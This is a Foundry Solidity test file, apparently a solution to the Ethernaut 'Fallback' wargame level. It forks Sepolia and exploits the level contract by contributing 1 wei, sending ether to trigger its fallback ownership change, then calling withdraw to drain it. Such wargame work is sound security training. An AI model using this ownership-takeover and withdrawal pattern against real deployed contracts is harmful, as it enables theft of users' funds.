// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../src/levels/01-Fallback/Fallback.sol"; // test/Billy/ folder

contract ContractTest2 is DSTest {
    Fallback level1 =
        Fallback(payable(0x96eC1951dF41aEbDBD90deB81A6Bae2d828Be4a1));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x96eC1951dF41aEbDBD90deB81A6Bae2d828Be4a1),
            "Ethernaut01"
        );
    }

    function testEthernaut01() public {
        level1.owner();

        level1.contribute{value: 1 wei}();
        level1.getContribution();

        address(level1).call{value: 1 wei}("");

        assert(address(this) == level1.owner()); // Attacker
        level1.withdraw();
    }

    receive() external payable {}
}
